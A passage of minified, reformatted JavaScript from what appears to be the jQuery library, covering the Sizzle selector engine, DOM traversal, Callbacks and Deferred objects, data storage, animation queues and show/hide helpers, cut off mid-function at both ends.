                      (u = e[x] || (e[x] = {}))[e.uniqueID] ||
                      (u[e.uniqueID] = {})),
                    o && o === e.nodeName.toLowerCase())
                  )
                    e = e[i] || e;
                  else {
                    if ((c = d[s]) && c[0] === w && c[1] === a)
                      return (p[2] = c[2]);
                    if (((d[s] = p), (p[2] = t(e, n, l)))) return !0;
                  }
                }
            return !1;
          };
    }
    function tw(t) {
      return t.length > 1
        ? function (e, n, i) {
            for (var o = t.length; o--; ) if (!t[o](e, n, i)) return !1;
            return !0;
          }
        : t[0];
    }
    function tT(t, e, n, i, o) {
      for (var s, r = [], a = 0, l = t.length, c = null != e; a < l; a++)
        (s = t[a]) && ((n && !n(s, i, o)) || (r.push(s), c && e.push(a)));
      return r;
    }
    function tS(t, e, n, i, o, s) {
      return (
        i && !i[x] && (i = tS(i)),
        o && !o[x] && (o = tS(o, s)),
        tu(function (s, r, a, l) {
          var c,
            d,
            u,
            p = [],
            f = [],
            h = r.length,
            g =
              s ||
              (function (t, e, n) {
                for (var i = 0, o = e.length; i < o; i++) tc(t, e[i], n);
                return n;
              })(e || "*", a.nodeType ? [a] : a, []),
            v = t && (s || !e) ? tT(g, p, t, a, l) : g,
            m = n ? (o || (s ? t : h || i) ? [] : r) : v;
          if ((n && n(v, m, a, l), i))
            for (c = tT(m, f), i(c, [], a, l), d = c.length; d--; )
              (u = c[d]) && (m[f[d]] = !(v[f[d]] = u));
          if (s) {
            if (o || t) {
              if (o) {
                for (c = [], d = m.length; d--; )
                  (u = m[d]) && c.push((v[d] = u));
                o(null, (m = []), c, l);
              }
              for (d = m.length; d--; )
                (u = m[d]) &&
                  (c = o ? O(s, u) : p[d]) > -1 &&
                  (s[c] = !(r[c] = u));
            }
          } else (m = tT(m === r ? m.splice(h, m.length) : m)), o ? o(null, r, m, l) : H.apply(r, m);
        })
      );
    }
    function tC(t) {
      for (
        var e,
          n,
          o,
          s = t.length,
          r = i.relative[t[0].type],
          a = r || i.relative[" "],
          l = r ? 1 : 0,
          d = t_(
            function (t) {
              return t === e;
            },
            a,
            !0
          ),
          u = t_(
            function (t) {
              return O(e, t) > -1;
            },
            a,
            !0
          ),
          p = [
            function (t, n, i) {
              var o =
                (!r && (i || n !== c)) ||
                ((e = n).nodeType ? d(t, n, i) : u(t, n, i));
              return (e = null), o;
            },
          ];
        l < s;
        l++
      )
        if ((n = i.relative[t[l].type])) p = [t_(tw(p), n)];
        else {
          if ((n = i.filter[t[l].type].apply(null, t[l].matches))[x]) {
            for (o = ++l; o < s && !i.relative[t[o].type]; o++);
            return tS(
              l > 1 && tw(p),
              l > 1 &&
                tx(
                  t
                    .slice(0, l - 1)
                    .concat({ value: " " === t[l - 2].type ? "*" : "" })
                ).replace(B, "$1"),
              n,
              l < o && tC(t.slice(l, o)),
              o < s && tC((t = t.slice(o))),
              o < s && tx(t)
            );
          }
          p.push(n);
        }
      return tw(p);
    }
    return (
      (tb.prototype = i.filters = i.pseudos),
      (i.setFilters = new tb()),
      (r = tc.tokenize =
        function (t, e) {
          var n,
            o,
            s,
            r,
            a,
            l,
            c,
            d = C[t + " "];
          if (d) return e ? 0 : d.slice(0);
          for (a = t, l = [], c = i.preFilter; a; ) {
            for (r in ((!n || (o = W.exec(a))) &&
              (o && (a = a.slice(o[0].length) || a), l.push((s = []))),
            (n = !1),
            (o = X.exec(a)) &&
              ((n = o.shift()),
              s.push({ value: n, type: o[0].replace(B, " ") }),
              (a = a.slice(n.length))),
            i.filter))
              (o = G[r].exec(a)) &&
                (!c[r] || (o = c[r](o))) &&
                ((n = o.shift()),
                s.push({ value: n, type: r, matches: o }),
                (a = a.slice(n.length)));
            if (!n) break;
          }
          return e ? a.length : a ? tc.error(t) : C(t, l).slice(0);
        }),
      (a = tc.compile =
        function (t, e) {
          var n,
            o,
            s,
            a,
            l,
            d,
            u = [],
            h = [],
            v = k[t + " "];
          if (!v) {
            for (e || (e = r(t)), d = e.length; d--; )
              (v = tC(e[d]))[x] ? u.push(v) : h.push(v);
            (v = k(
              t,
              ((n = h),
              (s = (o = u).length > 0),
              (a = n.length > 0),
              (l = function t(e, r, l, d, u) {
                var h,
                  v,
                  m,
                  y = 0,
                  b = "0",
                  x = e && [],
                  _ = [],
                  T = c,
                  S = e || (a && i.find.TAG("*", u)),
                  C = (w += null == T ? 1 : Math.random() || 0.1),
                  k = S.length;
                for (
                  u && (c = r == f || r || u);
                  b !== k && null != (h = S[b]);
                  b++
                ) {
                  if (a && h) {
                    for (
                      v = 0, r || h.ownerDocument == f || (p(h), (l = !g));
                      (m = n[v++]);

                    )
                      if (m(h, r || f, l)) {
                        d.push(h);
                        break;
                      }
                    u && (w = C);
                  }
                  s && ((h = !m && h) && y--, e && x.push(h));
                }
                if (((y += b), s && b !== y)) {
                  for (v = 0; (m = o[v++]); ) m(x, _, r, l);
                  if (e) {
                    if (y > 0) for (; b--; ) x[b] || _[b] || (_[b] = D.call(d));
                    _ = tT(_);
                  }
                  H.apply(d, _),
                    u &&
                      !e &&
                      _.length > 0 &&
                      y + o.length > 1 &&
                      tc.uniqueSort(d);
                }
                return u && ((w = C), (c = T)), x;
              }),
              s ? tu(l) : l)
            )).selector = t;
          }
          return v;
        }),
      (l = tc.select =
        function (t, e, n, o) {
          var s,
            l,
            c,
            d,
            u,
            p = "function" == typeof t && t,
            f = !o && r((t = p.selector || t));
          if (((n = n || []), 1 === f.length)) {
            if (
              (l = f[0] = f[0].slice(0)).length > 2 &&
              "ID" === (c = l[0]).type &&
              9 === e.nodeType &&
              g &&
              i.relative[l[1].type]
            ) {
              if (!(e = (i.find.ID(c.matches[0].replace(tn, ti), e) || [])[0]))
                return n;
              p && (e = e.parentNode), (t = t.slice(l.shift().value.length));
            }
            for (
              s = G.needsContext.test(t) ? 0 : l.length;
              s-- && ((c = l[s]), !i.relative[(d = c.type)]);

            )
              if (
                (u = i.find[d]) &&
                (o = u(
                  c.matches[0].replace(tn, ti),
                  (te.test(l[0].type) && t$(e.parentNode)) || e
                ))
              ) {
                if ((l.splice(s, 1), !(t = o.length && tx(l))))
                  return H.apply(n, o), n;
                break;
              }
          }
          return (
            (p || a(t, f))(
              o,
              e,
              !g,
              n,
              !e || (te.test(t) && t$(e.parentNode)) || e
            ),
            n
          );
        }),
      (n.sortStable = x.split("").sort(P).join("") === x),
      (n.detectDuplicates = !!u),
      p(),
      (n.sortDetached = tp(function (t) {
        return 1 & t.compareDocumentPosition(f.createElement("fieldset"));
      })),
      tp(function (t) {
        return (
          (t.innerHTML = "<a href='#'></a>"),
          "#" === t.firstChild.getAttribute("href")
        );
      }) ||
        tf("type|href|height|width", function (t, e, n) {
          if (!n) return t.getAttribute(e, "type" === e.toLowerCase() ? 1 : 2);
        }),
      (n.attributes &&
        tp(function (t) {
          return (
            (t.innerHTML = "<input/>"),
            t.firstChild.setAttribute("value", ""),
            "" === t.firstChild.getAttribute("value")
          );
        })) ||
        tf("value", function (t, e, n) {
          if (!n && "input" === t.nodeName.toLowerCase()) return t.defaultValue;
        }),
      tp(function (t) {
        return null == t.getAttribute("disabled");
      }) ||
        tf(N, function (t, e, n) {
          var i;
          if (!n)
            return !0 === t[e]
              ? e.toLowerCase()
              : (i = t.getAttributeNode(e)) && i.specified
              ? i.value
              : null;
        }),
      tc
    );
  })(t);
  (x.find = w),
    (x.expr = w.selectors),
    (x.expr[":"] = x.expr.pseudos),
    (x.uniqueSort = x.unique = w.uniqueSort),
    (x.text = w.getText),
    (x.isXMLDoc = w.isXML),
    (x.contains = w.contains),
    (x.escapeSelector = w.escape);
  var T = function t(e, n, i) {
      for (var o = [], s = void 0 !== i; (e = e[n]) && 9 !== e.nodeType; )
        if (1 === e.nodeType) {
          if (s && x(e).is(i)) break;
          o.push(e);
        }
      return o;
    },
    S = function t(e, n) {
      for (var i = []; e; e = e.nextSibling)
        1 === e.nodeType && e !== n && i.push(e);
      return i;
    },
    C = x.expr.match.needsContext;
  function k(t, e) {
    return t.nodeName && t.nodeName.toLowerCase() === e.toLowerCase();
  }
  var A = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
  function P(t, e, n) {
    return h(e)
      ? x.grep(t, function (t, i) {
          return !!e.call(t, i, t) !== n;
        })
      : e.nodeType
      ? x.grep(t, function (t) {
          return (t === e) !== n;
        })
      : "string" != typeof e
      ? x.grep(t, function (t) {
          return a.call(e, t) > -1 !== n;
        })
      : x.filter(e, t, n);
  }
  (x.filter = function (t, e, n) {
    var i = e[0];
    return (
      n && (t = ":not(" + t + ")"),
      1 === e.length && 1 === i.nodeType
        ? x.find.matchesSelector(i, t)
          ? [i]
          : []
        : x.find.matches(
            t,
            x.grep(e, function (t) {
              return 1 === t.nodeType;
            })
          )
    );
  }),
    x.fn.extend({
      find: function t(e) {
        var n,
          i,
          o = this.length,
          s = this;
        if ("string" != typeof e)
          return this.pushStack(
            x(e).filter(function () {
              for (n = 0; n < o; n++) if (x.contains(s[n], this)) return !0;
            })
          );
        for (i = this.pushStack([]), n = 0; n < o; n++) x.find(e, s[n], i);
        return o > 1 ? x.uniqueSort(i) : i;
      },
      filter: function t(e) {
        return this.pushStack(P(this, e || [], !1));
      },
      not: function t(e) {
        return this.pushStack(P(this, e || [], !0));
      },
      is: function t(e) {
        return !!P(this, "string" == typeof e && C.test(e) ? x(e) : e || [], !1)
          .length;
      },
    });
  var E,
    L = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
  ((x.fn.init = function (t, e, n) {
    var i, o;
    if (!t) return this;
    if (((n = n || E), "string" == typeof t)) {
      if (
        !(i =
          "<" === t[0] && ">" === t[t.length - 1] && t.length >= 3
            ? [null, t, null]
            : L.exec(t)) ||
        (!i[1] && e)
      )
        return !e || e.jquery ? (e || n).find(t) : this.constructor(e).find(t);
      if (i[1]) {
        if (
          ((e = e instanceof x ? e[0] : e),
          x.merge(
            this,
            x.parseHTML(i[1], e && e.nodeType ? e.ownerDocument || e : v, !0)
          ),
          A.test(i[1]) && x.isPlainObject(e))
        )
          for (i in e) h(this[i]) ? this[i](e[i]) : this.attr(i, e[i]);
        return this;
      }
      return (
        (o = v.getElementById(i[2])) && ((this[0] = o), (this.length = 1)), this
      );
    }
    return t.nodeType
      ? ((this[0] = t), (this.length = 1), this)
      : h(t)
      ? void 0 !== n.ready
        ? n.ready(t)
        : t(x)
      : x.makeArray(t, this);
  }).prototype = x.fn),
    (E = x(v));
  var D = /^(?:parents|prev(?:Until|All))/,
    j = { children: !0, contents: !0, next: !0, prev: !0 };
  function H(t, e) {
    for (; (t = t[e]) && 1 !== t.nodeType; );
    return t;
  }
  x.fn.extend({
    has: function t(e) {
      var n = x(e, this),
        i = n.length;
      return this.filter(function () {
        for (var t = 0; t < i; t++) if (x.contains(this, n[t])) return !0;
      });
    },
    closest: function t(e, n) {
      var i,
        o = 0,
        s = this.length,
        r = [],
        a = "string" != typeof e && x(e);
      if (!C.test(e)) {
        for (; o < s; o++)
          for (i = this[o]; i && i !== n; i = i.parentNode)
            if (
              i.nodeType < 11 &&
              (a
                ? a.index(i) > -1
                : 1 === i.nodeType && x.find.matchesSelector(i, e))
            ) {
              r.push(i);
              break;
            }
      }
      return this.pushStack(r.length > 1 ? x.uniqueSort(r) : r);
    },
    index: function t(e) {
      return e
        ? "string" == typeof e
          ? a.call(x(e), this[0])
          : a.call(this, e.jquery ? e[0] : e)
        : this[0] && this[0].parentNode
        ? this.first().prevAll().length
        : -1;
    },
    add: function t(e, n) {
      return this.pushStack(x.uniqueSort(x.merge(this.get(), x(e, n))));
    },
    addBack: function t(e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    },
  }),
    x.each(
      {
        parent: function t(e) {
          var n = e.parentNode;
          return n && 11 !== n.nodeType ? n : null;
        },
        parents: function t(e) {
          return T(e, "parentNode");
        },
        parentsUntil: function t(e, n, i) {
          return T(e, "parentNode", i);
        },
        next: function t(e) {
          return H(e, "nextSibling");
        },
        prev: function t(e) {
          return H(e, "previousSibling");
        },
        nextAll: function t(e) {
          return T(e, "nextSibling");
        },
        prevAll: function t(e) {
          return T(e, "previousSibling");
        },
        nextUntil: function t(e, n, i) {
          return T(e, "nextSibling", i);
        },
        prevUntil: function t(e, n, i) {
          return T(e, "previousSibling", i);
        },
        siblings: function t(e) {
          return S((e.parentNode || {}).firstChild, e);
        },
        children: function t(e) {
          return S(e.firstChild);
        },
        contents: function t(e) {
          return null != e.contentDocument && i(e.contentDocument)
            ? e.contentDocument
            : (k(e, "template") && (e = e.content || e),
              x.merge([], e.childNodes));
        },
      },
      function (t, e) {
        x.fn[t] = function (n, i) {
          var o = x.map(this, e, n);
          return (
            "Until" !== t.slice(-5) && (i = n),
            i && "string" == typeof i && (o = x.filter(i, o)),
            this.length > 1 &&
              (j[t] || x.uniqueSort(o), D.test(t) && o.reverse()),
            this.pushStack(o)
          );
        };
      }
    );
  var q = /[^\x20\t\r\n\f]+/g;
  function O(t) {
    return t;
  }
  function N(t) {
    throw t;
  }
  function z(t, e, n, i) {
    var o;
    try {
      t && h((o = t.promise))
        ? o.call(t).done(e).fail(n)
        : t && h((o = t.then))
        ? o.call(t, e, n)
        : e.apply(void 0, [t].slice(i));
    } catch (s) {
      n.apply(void 0, [s]);
    }
  }
  (x.Callbacks = function (t) {
    t =
      "string" == typeof t
        ? ((e = t),
          (n = {}),
          x.each(e.match(q) || [], function (t, e) {
            n[e] = !0;
          }),
          n)
        : x.extend({}, t);
    var e,
      n,
      i,
      o,
      s,
      r,
      a = [],
      l = [],
      c = -1,
      d = function e() {
        for (r = r || t.once, s = i = !0; l.length; c = -1)
          for (o = l.shift(); ++c < a.length; )
            !1 === a[c].apply(o[0], o[1]) &&
              t.stopOnFalse &&
              ((c = a.length), (o = !1));
        t.memory || (o = !1), (i = !1), r && (a = o ? [] : "");
      },
      u = {
        add: function e() {
          return (
            a &&
              (o && !i && ((c = a.length - 1), l.push(o)),
              (function e(n) {
                x.each(n, function (n, i) {
                  h(i)
                    ? (t.unique && u.has(i)) || a.push(i)
                    : i && i.length && "string" !== b(i) && e(i);
                });
              })(arguments),
              o && !i && d()),
            this
          );
        },
        remove: function t() {
          return (
            x.each(arguments, function (t, e) {
              for (var n; (n = x.inArray(e, a, n)) > -1; )
                a.splice(n, 1), n <= c && c--;
            }),
            this
          );
        },
        has: function t(e) {
          return e ? x.inArray(e, a) > -1 : a.length > 0;
        },
        empty: function t() {
          return a && (a = []), this;
        },
        disable: function t() {
          return (r = l = []), (a = o = ""), this;
        },
        disabled: function t() {
          return !a;
        },
        lock: function t() {
          return (r = l = []), o || i || (a = o = ""), this;
        },
        locked: function t() {
          return !!r;
        },
        fireWith: function t(e, n) {
          return (
            r ||
              ((n = [e, (n = n || []).slice ? n.slice() : n]),
              l.push(n),
              i || d()),
            this
          );
        },
        fire: function t() {
          return u.fireWith(this, arguments), this;
        },
        fired: function t() {
          return !!s;
        },
      };
    return u;
  }),
    x.extend({
      Deferred: function e(n) {
        var i = [
            [
              "notify",
              "progress",
              x.Callbacks("memory"),
              x.Callbacks("memory"),
              2,
            ],
            [
              "resolve",
              "done",
              x.Callbacks("once memory"),
              x.Callbacks("once memory"),
              0,
              "resolved",
            ],
            [
              "reject",
              "fail",
              x.Callbacks("once memory"),
              x.Callbacks("once memory"),
              1,
              "rejected",
            ],
          ],
          o = "pending",
          s = {
            state: function t() {
              return o;
            },
            always: function t() {
              return r.done(arguments).fail(arguments), this;
            },
            catch: function t(e) {
              return s.then(null, e);
            },
            pipe: function t() {
              var e = arguments;
              return x
                .Deferred(function (t) {
                  x.each(i, function (n, i) {
                    var o = h(e[i[4]]) && e[i[4]];
                    r[i[1]](function () {
                      var e = o && o.apply(this, arguments);
                      e && h(e.promise)
                        ? e
                            .promise()
                            .progress(t.notify)
                            .done(t.resolve)
                            .fail(t.reject)
                        : t[i[0] + "With"](this, o ? [e] : arguments);
                    });
                  }),
                    (e = null);
                })
                .promise();
            },
            then: function e(n, o, s) {
              var r = 0;
              function a(e, n, i, o) {
                return function () {
                  var s = this,
                    l = arguments,
                    c = function t() {
                      var c, t;
                      if (!(e < r)) {
                        if ((c = i.apply(s, l)) === n.promise())
                          throw TypeError("Thenable self-resolution");
                        (t =
                          c &&
                          ("object" == _typeof(c) || "function" == typeof c) &&
                          c.then),
                          h(t)
                            ? o
                              ? t.call(c, a(r, n, O, o), a(r, n, N, o))
                              : (r++,
                                t.call(
                                  c,
                                  a(r, n, O, o),
                                  a(r, n, N, o),
                                  a(r, n, O, n.notifyWith)
                                ))
                            : (i !== O && ((s = void 0), (l = [c])),
                              (o || n.resolveWith)(s, l));
                      }
                    },
                    d = o
                      ? c
                      : function () {
                          try {
                            c();
                          } catch (t) {
                            x.Deferred.exceptionHook &&
                              x.Deferred.exceptionHook(t, d.stackTrace),
                              e + 1 >= r &&
                                (i !== N && ((s = void 0), (l = [t])),
                                n.rejectWith(s, l));
                          }
                        };
                  e
                    ? d()
                    : (x.Deferred.getStackHook &&
                        (d.stackTrace = x.Deferred.getStackHook()),
                      t.setTimeout(d));
                };
              }
              return x
                .Deferred(function (t) {
                  i[0][3].add(a(0, t, h(s) ? s : O, t.notifyWith)),
                    i[1][3].add(a(0, t, h(n) ? n : O)),
                    i[2][3].add(a(0, t, h(o) ? o : N));
                })
                .promise();
            },
            promise: function t(e) {
              return null != e ? x.extend(e, s) : s;
            },
          },
          r = {};
        return (
          x.each(i, function (t, e) {
            var n = e[2],
              a = e[5];
            (s[e[1]] = n.add),
              a &&
                n.add(
                  function () {
                    o = a;
                  },
                  i[3 - t][2].disable,
                  i[3 - t][3].disable,
                  i[0][2].lock,
                  i[0][3].lock
                ),
              n.add(e[3].fire),
              (r[e[0]] = function () {
                return (
                  r[e[0] + "With"](this === r ? void 0 : this, arguments), this
                );
              }),
              (r[e[0] + "With"] = n.fireWith);
          }),
          s.promise(r),
          n && n.call(r, r),
          r
        );
      },
      when: function t(e) {
        var n = arguments.length,
          i = n,
          s = Array(i),
          r = o.call(arguments),
          a = x.Deferred(),
          l = function t(e) {
            return function (t) {
              (s[e] = this),
                (r[e] = arguments.length > 1 ? o.call(arguments) : t),
                --n || a.resolveWith(s, r);
            };
          };
        if (
          n <= 1 &&
          (z(e, a.done(l(i)).resolve, a.reject, !n),
          "pending" === a.state() || h(r[i] && r[i].then))
        )
          return a.then();
        for (; i--; ) z(r[i], l(i), a.reject);
        return a.promise();
      },
    });
  var I = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
  (x.Deferred.exceptionHook = function (e, n) {
    t.console &&
      t.console.warn &&
      e &&
      I.test(e.name) &&
      t.console.warn("jQuery.Deferred exception: " + e.message, e.stack, n);
  }),
    (x.readyException = function (e) {
      t.setTimeout(function () {
        throw e;
      });
    });
  var F = x.Deferred();
  function M() {
    v.removeEventListener("DOMContentLoaded", M),
      t.removeEventListener("load", M),
      x.ready();
  }
  (x.fn.ready = function (t) {
    return (
      F.then(t).catch(function (t) {
        x.readyException(t);
      }),
      this
    );
  }),
    x.extend({
      isReady: !1,
      readyWait: 1,
      ready: function t(e) {
        (!0 === e ? --x.readyWait : x.isReady) ||
          ((x.isReady = !0),
          (!0 !== e && --x.readyWait > 0) || F.resolveWith(v, [x]));
      },
    }),
    (x.ready.then = F.then),
    "complete" !== v.readyState &&
    ("loading" === v.readyState || v.documentElement.doScroll)
      ? (v.addEventListener("DOMContentLoaded", M),
        t.addEventListener("load", M))
      : t.setTimeout(x.ready);
  var R = function t(e, n, i, o, s, r, a) {
      var l = 0,
        c = e.length,
        d = null == i;
      if ("object" === b(i))
        for (l in ((s = !0), i)) t(e, n, l, i[l], !0, r, a);
      else if (
        void 0 !== o &&
        ((s = !0),
        h(o) || (a = !0),
        d &&
          (a
            ? (n.call(e, o), (n = null))
            : ((d = n),
              (n = function t(e, n, i) {
                return d.call(x(e), i);
              }))),
        n)
      )
        for (; l < c; l++) n(e[l], i, a ? o : o.call(e[l], l, n(e[l], i)));
      return s ? e : d ? n.call(e) : c ? n(e[0], i) : r;
    },
    B = /^-ms-/,
    W = /-([a-z])/g;
  function X(t, e) {
    return e.toUpperCase();
  }
  function Y(t) {
    return t.replace(B, "ms-").replace(W, X);
  }
  var U = function t(e) {
    return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
  };
  function V() {
    this.expando = x.expando + V.uid++;
  }
  (V.uid = 1),
    (V.prototype = {
      cache: function t(e) {
        var n = e[this.expando];
        return (
          n ||
            ((n = {}),
            U(e) &&
              (e.nodeType
                ? (e[this.expando] = n)
                : Object.defineProperty(e, this.expando, {
                    value: n,
                    configurable: !0,
                  }))),
          n
        );
      },
      set: function t(e, n, i) {
        var o,
          s = this.cache(e);
        if ("string" == typeof n) s[Y(n)] = i;
        else for (o in n) s[Y(o)] = n[o];
        return s;
      },
      get: function t(e, n) {
        return void 0 === n
          ? this.cache(e)
          : e[this.expando] && e[this.expando][Y(n)];
      },
      access: function t(e, n, i) {
        return void 0 === n || (n && "string" == typeof n && void 0 === i)
          ? this.get(e, n)
          : (this.set(e, n, i), void 0 !== i ? i : n);
      },
      remove: function t(e, n) {
        var i,
          o = e[this.expando];
        if (void 0 !== o) {
          if (void 0 !== n)
            for (
              i = (n = Array.isArray(n)
                ? n.map(Y)
                : ((n = Y(n)) in o)
                ? [n]
                : n.match(q) || []).length;
              i--;

            )
              delete o[n[i]];
          (void 0 === n || x.isEmptyObject(o)) &&
            (e.nodeType ? (e[this.expando] = void 0) : delete e[this.expando]);
        }
      },
      hasData: function t(e) {
        var n = e[this.expando];
        return void 0 !== n && !x.isEmptyObject(n);
      },
    });
  var G = new V(),
    K = new V(),
    Z = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    J = /[A-Z]/g;
  function Q(t, e, n) {
    var i, o;
    if (void 0 === n && 1 === t.nodeType) {
      if (
        ((i = "data-" + e.replace(J, "-$&").toLowerCase()),
        "string" == typeof (n = t.getAttribute(i)))
      ) {
        try {
          n =
            ((o = n),
            "true" === o ||
              ("false" !== o &&
                ("null" === o
                  ? null
                  : o === +o + ""
                  ? +o
                  : Z.test(o)
                  ? JSON.parse(o)
                  : o)));
        } catch (s) {}
        K.set(t, e, n);
      } else n = void 0;
    }
    return n;
  }
  x.extend({
    hasData: function t(e) {
      return K.hasData(e) || G.hasData(e);
    },
    data: function t(e, n, i) {
      return K.access(e, n, i);
    },
    removeData: function t(e, n) {
      K.remove(e, n);
    },
    _data: function t(e, n, i) {
      return G.access(e, n, i);
    },
    _removeData: function t(e, n) {
      G.remove(e, n);
    },
  }),
    x.fn.extend({
      data: function t(e, n) {
        var i,
          o,
          s,
          r = this[0],
          a = r && r.attributes;
        if (void 0 === e) {
          if (
            this.length &&
            ((s = K.get(r)), 1 === r.nodeType && !G.get(r, "hasDataAttrs"))
          ) {
            for (i = a.length; i--; )
              a[i] &&
                0 === (o = a[i].name).indexOf("data-") &&
                Q(r, (o = Y(o.slice(5))), s[o]);
            G.set(r, "hasDataAttrs", !0);
          }
          return s;
        }
        return "object" == _typeof(e)
          ? this.each(function () {
              K.set(this, e);
            })
          : R(
              this,
              function (t) {
                var n;
                if (r && void 0 === t)
                  return void 0 !== (n = K.get(r, e))
                    ? n
                    : void 0 !== (n = Q(r, e))
                    ? n
                    : void 0;
                this.each(function () {
                  K.set(this, e, t);
                });
              },
              null,
              n,
              arguments.length > 1,
              null,
              !0
            );
      },
      removeData: function t(e) {
        return this.each(function () {
          K.remove(this, e);
        });
      },
    }),
    x.extend({
      queue: function t(e, n, i) {
        var o;
        if (e)
          return (
            (n = (n || "fx") + "queue"),
            (o = G.get(e, n)),
            i &&
              (!o || Array.isArray(i)
                ? (o = G.access(e, n, x.makeArray(i)))
                : o.push(i)),
            o || []
          );
      },
      dequeue: function t(e, n) {
        n = n || "fx";
        var i = x.queue(e, n),
          o = i.length,
          s = i.shift(),
          r = x._queueHooks(e, n);
        "inprogress" === s && ((s = i.shift()), o--),
          s &&
            ("fx" === n && i.unshift("inprogress"),
            delete r.stop,
            s.call(
              e,
              function () {
                x.dequeue(e, n);
              },
              r
            )),
          !o && r && r.empty.fire();
      },
      _queueHooks: function t(e, n) {
        var i = n + "queueHooks";
        return (
          G.get(e, i) ||
          G.access(e, i, {
            empty: x.Callbacks("once memory").add(function () {
              G.remove(e, [n + "queue", i]);
            }),
          })
        );
      },
    }),
    x.fn.extend({
      queue: function t(e, n) {
        var i = 2;
        return (
          "string" != typeof e && ((n = e), (e = "fx"), i--),
          arguments.length < i
            ? x.queue(this[0], e)
            : void 0 === n
            ? this
            : this.each(function () {
                var t = x.queue(this, e, n);
                x._queueHooks(this, e),
                  "fx" === e && "inprogress" !== t[0] && x.dequeue(this, e);
              })
        );
      },
      dequeue: function t(e) {
        return this.each(function () {
          x.dequeue(this, e);
        });
      },
      clearQueue: function t(e) {
        return this.queue(e || "fx", []);
      },
      promise: function t(e, n) {
        var i,
          o = 1,
          s = x.Deferred(),
          r = this,
          a = this.length,
          l = function t() {
            --o || s.resolveWith(r, [r]);
          };
        for (
          "string" != typeof e && ((n = e), (e = void 0)), e = e || "fx";
          a--;

        )
          (i = G.get(r[a], e + "queueHooks")) &&
            i.empty &&
            (o++, i.empty.add(l));
        return l(), s.promise(n);
      },
    });
  var tt = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    te = RegExp("^(?:([+-])=|)(" + tt + ")([a-z%]*)$", "i"),
    tn = ["Top", "Right", "Bottom", "Left"],
    ti = v.documentElement,
    to = function t(e) {
      return x.contains(e.ownerDocument, e);
    },
    ts = { composed: !0 };
  ti.getRootNode &&
    (to = function t(e) {
      return (
        x.contains(e.ownerDocument, e) || e.getRootNode(ts) === e.ownerDocument
      );
    });
  var tr = function t(e, n) {
    return (
      "none" === (e = n || e).style.display ||
      ("" === e.style.display && to(e) && "none" === x.css(e, "display"))
    );
  };
  function ta(t, e, n, i) {
    var o,
      s,
      r = 20,
      a = i
        ? function () {
            return i.cur();
          }
        : function () {
            return x.css(t, e, "");
          },
      l = a(),
      c = (n && n[3]) || (x.cssNumber[e] ? "" : "px"),
      d =
        t.nodeType &&
        (x.cssNumber[e] || ("px" !== c && +l)) &&
        te.exec(x.css(t, e));
    if (d && d[3] !== c) {
      for (l /= 2, c = c || d[3], d = +l || 1; r--; )
        x.style(t, e, d + c),
          (1 - s) * (1 - (s = a() / l || 0.5)) <= 0 && (r = 0),
          (d /= s);
      (d *= 2), x.style(t, e, d + c), (n = n || []);
    }
    return (
      n &&
        ((d = +d || +l || 0),
        (o = n[1] ? d + (n[1] + 1) * n[2] : +n[2]),
        i && ((i.unit = c), (i.start = d), (i.end = o))),
      o
    );
  }
  var tl = {};
  function tc(t) {
    var e,
      n = t.ownerDocument,
      i = t.nodeName,
      o = tl[i];
    return (
      o ||
      ((e = n.body.appendChild(n.createElement(i))),
      (o = x.css(e, "display")),
      e.parentNode.removeChild(e),
      "none" === o && (o = "block"),
      (tl[i] = o),
      o)
    );
  }
  function td(t, e) {
    for (var n, i, o = [], s = 0, r = t.length; s < r; s++)
      (i = t[s]).style &&
        ((n = i.style.display),
        e
          ? ("none" === n &&
              ((o[s] = G.get(i, "display") || null),
              o[s] || (i.style.display = "")),
            "" === i.style.display && tr(i) && (o[s] = tc(i)))
          : "none" !== n && ((o[s] = "none"), G.set(i, "display", n)));
    for (s = 0; s < r; s++) null != o[s] && (t[s].style.display = o[s]);
    return t;
  }
  x.fn.extend({
    show: function t() {
      return td(this, !0);
    },
    hide: function t() {
      return td(this);
    },
    toggle: function t(e) {
      return "boolean" == typeof e
        ? e
          ? this.show()
          : this.hide()
        : this.each(function () {
            tr(this) ? x(this).show() : x(this).hide();
          });
    },
  });
  var tu,
    tp,
    tf = /^(?:checkbox|radio)$/i,
    th = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
    tg = /^$|^module$|\/(?:java|ecma)script/i;
  (tu = v.createDocumentFragment().appendChild(v.createElement("div"))),
    (tp = v.createElement("input")).setAttribute("type", "radio"),
    tp.setAttribute("checked", "checked"),
    tp.setAttribute("name", "t"),
    tu.appendChild(tp),
    (f.checkClone = tu.cloneNode(!0).cloneNode(!0).lastChild.checked),
    (tu.innerHTML = "<textarea>x</textarea>"),
    (f.noCloneChecked = !!tu.cloneNode(!0).lastChild.defaultValue),
    (tu.innerHTML = "<option></option>"),
    (f.option = !!tu.lastChild);
  var tv = {
    thead: [1, "<table>", "</table>"],
    col: [2, "<table><colgroup>", "</colgroup></table>"],
    tr: [2, "<table><tbody>", "</tbody></table>"],
    td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
    _default: [0, "", ""],
  };
  function tm(t, e) {
    var n;
    return (
      (n =
        void 0 !== t.getElementsByTagName
          ? t.getElementsByTagName(e || "*")
          : void 0 !== t.querySelectorAll
          ? t.querySelectorAll(e || "*")
          : []),
      void 0 === e || (e && k(t, e)) ? x.merge([t], n) : n
    );
  }
  function ty(t, e) {
    for (var n = 0, i = t.length; n < i; n++)
      G.set(t[n], "globalEval", !e || G.get(e[n], "globalEval"));
  }
  (tv.tbody = tv.tfoot = tv.colgroup = tv.caption = tv.thead),
    (tv.th = tv.td),
    f.option ||
      (tv.optgroup = tv.option =
        [1, "<select multiple='multiple'>", "</select>"]);
  var t$ = /<|&#?\w+;/;
  function tb(t, e, n, i, o) {
    for (
      var s,
        r,
        a,
        l,
        c,
        d,
        u = e.createDocumentFragment(),
        p = [],
        f = 0,
        h = t.length;
      f < h;
      f++
    )
      if ((s = t[f]) || 0 === s) {
        if ("object" === b(s)) x.merge(p, s.nodeType ? [s] : s);
        else if (t$.test(s)) {
          for (
            r = r || u.appendChild(e.createElement("div")),
